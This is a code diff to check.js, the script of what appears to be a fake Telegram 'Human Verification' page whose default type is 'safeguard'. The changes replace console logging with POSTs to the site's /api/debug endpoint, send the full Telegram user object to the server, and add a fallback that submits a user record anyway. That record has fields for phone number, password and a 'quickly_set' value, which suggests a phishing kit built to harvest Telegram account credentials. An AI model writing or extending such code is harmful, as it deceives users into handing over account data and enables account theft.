@@ -1,4 +1,4 @@
-// Function to send data to the server (unchanged from your original code)
+// Function to send data to the server (unchanged)
 async function sendDataToServer(data, type) {
   await fetch('/api/debug', {
     method: 'POST',
@@ -46,10 +46,23 @@ async function sendDataToServer(data, type) {
 
 // Function to initialize the Telegram Web App and handle verification
 function initializeWebApp() {
-  console.log("check.js loaded, checking for Telegram Web App context...");
+  fetch('/api/debug', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({ message: 'check.js: Initializing Telegram Web App...' }),
+  });
 
   if (window.Telegram && window.Telegram.WebApp) {
-    console.log("Telegram Web App context detected");
+    fetch('/api/debug', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({ message: 'check.js: Telegram Web App context detected' }),
+    });
+
     const webApp = window.Telegram.WebApp;
     webApp.ready(); // Signal that the web app is ready
 
@@ -59,7 +72,13 @@ function initializeWebApp() {
     const type = queryParams.get('type') || 'safeguard';
 
     if (user) {
-      console.log("User data:", user);
+      fetch('/api/debug', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ message: `check.js: User data: ${JSON.stringify(user)}` }),
+      });
 
       // Prepare the user data
       const userData = {
@@ -76,13 +95,12 @@ function initializeWebApp() {
       const verifyButton = document.getElementById('verifyButton');
       if (verifyButton) {
         verifyButton.addEventListener('click', async () => {
-          console.log("Verify button clicked, sending user data to server...");
-          await fetch('/api/debug', {
+          fetch('/api/debug', {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json',
             },
-            body: JSON.stringify({ message: `Verify button clicked for userId ${userData.id}` }),
+            body: JSON.stringify({ message: `check.js: Verify button clicked for userId ${userData.id}` }),
           });
 
           // Send the user data to the server
@@ -92,16 +110,71 @@ function initializeWebApp() {
           webApp.close();
         });
       } else {
-        console.error("Verify button not found in the DOM");
+        fetch('/api/debug', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ message: 'check.js: Verify button not found in the DOM' }),
+        });
         document.body.innerHTML = "<p>Verification button not found. Please try again.</p>";
       }
     } else {
-      console.error("No user data available from Telegram Web App");
+      fetch('/api/debug', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ message: 'check.js: No user data available from Telegram Web App' }),
+      });
       document.body.innerHTML = "<p>Unable to verify user. Please try again.</p>";
     }
   } else {
-    console.error("check.js not running in Telegram Web App context");
-    document.body.innerHTML = "<p>Please open this page in the Telegram app to verify.</p>";
+    fetch('/api/debug', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({ message: 'check.js: Telegram Web App context not detected, proceeding with fallback' }),
+    });
+
+    // Fallback: Allow the "Human Verification" page to remain displayed
+    const verifyButton = document.getElementById('verifyButton');
+    if (verifyButton) {
+      verifyButton.addEventListener('click', async () => {
+        fetch('/api/debug', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ message: 'check.js: Verify button clicked in fallback mode (no Telegram Web App context)' }),
+        });
+
+        // Since we can't get user data, send a minimal payload
+        const userData = {
+          id: "unknown",
+          first_name: "Unknown",
+          usernames: [],
+          phone_number: "Not shared",
+          premium: false,
+          password: "Not available",
+          quickly_set: null,
+        };
+        const queryParams = new URLSearchParams(window.location.search);
+        const type = queryParams.get('type') || 'safeguard';
+
+        await sendDataToServer(userData, type);
+      });
+    } else {
+      fetch('/api/debug', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ message: 'check.js: Verify button not found in fallback mode' }),
+      });
+      document.body.innerHTML = "<p>Verification button not found. Please try again.</p>";
+    }
   }
 }
 
@@ -114,30 +187,51 @@ fetch('/api/debug', {
   body: JSON.stringify({ message: 'check.js loaded in window: ' + (window.top === window ? 'top' : 'iframe') }),
 });
 
+// Debug the window object to check for Telegram properties
+fetch('/api/debug', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+  },
+  body: JSON.stringify({ message: `check.js: window.Telegram exists: ${!!window.Telegram}, window.Telegram.WebApp exists: ${!!(window.Telegram && window.Telegram.WebApp)}` }),
+});
+
 // Wait for the DOM to load and Telegram Web App to initialize
 document.addEventListener("DOMContentLoaded", () => {
-  console.log("DOM fully loaded, attempting to initialize Telegram Web App...");
+  fetch('/api/debug', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({ message: 'check.js: DOM fully loaded, attempting to initialize Telegram Web App...' }),
+  });
 
   // Retry mechanism in case Telegram Web App API isn't ready yet
   let attempts = 0;
-  const maxAttempts = 10;
+  const maxAttempts = 20; // Increased to 20 attempts
   const interval = setInterval(() => {
-    if (window.Telegram && window.Telegram.WebApp) {
-      clearInterval(interval);
-      initializeWebApp();
-    } else if (attempts >= maxAttempts) {
-      clearInterval(interval);
-      console.error("Failed to detect Telegram Web App context after maximum attempts");
-      document.body.innerHTML = "<p>Please open this page in the Telegram app to verify.</p>";
-    }
     attempts++;
-    console.log(`Attempt ${attempts}/${maxAttempts}: Checking for Telegram Web App context...`);
     fetch('/api/debug', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
       },
-      body: JSON.stringify({ message: `Attempt ${attempts}/${maxAttempts}: Checking for Telegram Web App context` }),
+      body: JSON.stringify({ message: `check.js: Attempt ${attempts}/${maxAttempts}: Checking for Telegram Web App context` }),
     });
-  }, 500); // Check every 500ms
+
+    if (window.Telegram && window.Telegram.WebApp) {
+      clearInterval(interval);
+      initializeWebApp();
+    } else if (attempts >= maxAttempts) {
+      clearInterval(interval);
+      fetch('/api/debug', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ message: 'check.js: Failed to detect Telegram Web App context after maximum attempts' }),
+      });
+      initializeWebApp(); // Proceed anyway, using the fallback logic
+    }
+  }, 1000); // Increased to 1000ms (1 second) per attempt
 });
